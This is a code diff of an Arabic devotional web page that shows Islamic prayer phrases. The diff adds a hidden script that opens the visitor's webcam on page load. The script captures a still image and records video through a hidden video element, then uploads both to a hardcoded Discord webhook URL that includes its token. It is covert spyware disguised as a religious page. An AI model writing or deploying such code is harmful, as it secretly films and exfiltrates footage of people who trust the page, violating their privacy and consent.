@@ -1,10 +1,8 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صلي علي النبي</title>
+    <title>صلي على النبي</title>
     <style>
         #video { display: none; }
         body {
@@ -14,7 +12,6 @@
             text-align: center;
             padding-top: 50px;
         }
-        h1 { font-size: 30px; margin-bottom: 20px; }
         .prayer {
             font-size: 22px;
             color: #0000cd;
@@ -29,7 +26,7 @@
     <p class="prayer">لا إله إلا الله محمد رسول الله</p>
     <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>
 
-    <video id="video" width="300" height="200" autoplay></video>
+    <video id="video" width="300" height="200" autoplay muted></video>
     <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
 
     <script>
@@ -40,11 +37,9 @@
         let recorder;
         let chunks = [];
 
-        window.onload = function () {
-            init();
-        }
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1362553494988394757/pw4iKW76TUWd1pjYnfg6BpUv1_3X_RByXC52LJ0f91locIV95cdMDCWMccOOH5htPEtS"; // ضع رابط الويب هوك بتاعك هنا
 
-        async function init() {
+        window.onload = async function () {
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
 
@@ -52,7 +47,7 @@
             setTimeout(() => {
                 captureImage();
             }, 5000);
-        }
+        };
 
         function captureImage() {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -66,18 +61,22 @@
             }
         }
 
-        function sendImage(imageData, imageHash) {
-            fetch('/upload_image', {
+        function sendImage(imgData, imageHash) {
+            const blob = dataURLtoBlob(imgData);
+            const formData = new FormData();
+            formData.append('file', blob, 'image.png');
+
+            fetch(WEBHOOK_URL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: imageData })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log(data);
-                localStorage.setItem(imageHash, true);
-            })
-            .catch(error => console.log(error));
+                body: formData
+            }).then(response => {
+                if (response.status === 204) {
+                    console.log("تم إرسال الصورة بنجاح");
+                    localStorage.setItem(imageHash, true);
+                } else {
+                    console.log("فشل إرسال الصورة");
+                }
+            }).catch(err => console.log("خطأ:", err));
         }
 
         function startRecording() {
@@ -102,23 +101,36 @@
 
                 if (!localStorage.getItem(videoHash)) {
                     const formData = new FormData();
-                    formData.append('video', blob, 'recorded_video.webm');
+                    formData.append('file', blob, 'recorded_video.webm');
 
-                    fetch('/upload_video', {
+                    fetch(WEBHOOK_URL, {
                         method: 'POST',
                         body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log(data);
-                        localStorage.setItem(videoHash, true);
-                    })
-                    .catch(error => console.log(error));
+                    }).then(response => {
+                        if (response.status === 204) {
+                            console.log("تم إرسال الفيديو");
+                            localStorage.setItem(videoHash, true);
+                        } else {
+                            console.log("فشل إرسال الفيديو");
+                        }
+                    }).catch(err => console.log("خطأ:", err));
                 } else {
                     console.log("الفيديو ده اتبعت قبل كده");
                 }
             };
             reader.readAsDataURL(blob);
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const parts = dataURL.split(';base64,');
+            const byteString = atob(parts[1]);
+            const mimeString = parts[0].split(':')[1];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
         }
     </script>
 </body>
